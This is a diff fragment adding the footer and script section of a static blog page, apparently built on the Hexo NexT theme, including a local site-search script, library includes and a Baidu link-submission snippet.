+</script>
+-->
+
+
+<!--<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="https://kevien.github.io/static/api/js/canvas-nest.min.js"></script>-->
+<script src="https://kevien.github.io/static/api/js/love.js"></script>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+     <!-- 来必力City版安装代码 -->
+     <!--
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU4MS82MTQ5">
+        <script type="text/javascript">
+         (function(d, s) {
+             var j, e = d.getElementsByTagName(s)[0];
+
+             if (typeof LivereTower === 'function') { return; }
+
+             j = d.createElement(s);
+             j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+             j.async = true;
+
+             e.parentNode.insertBefore(j, e);
+         })(document, 'script');
+        </script>
+      <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+      </div>
+      -->
+<!-- City版安装代码已完成 -->
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
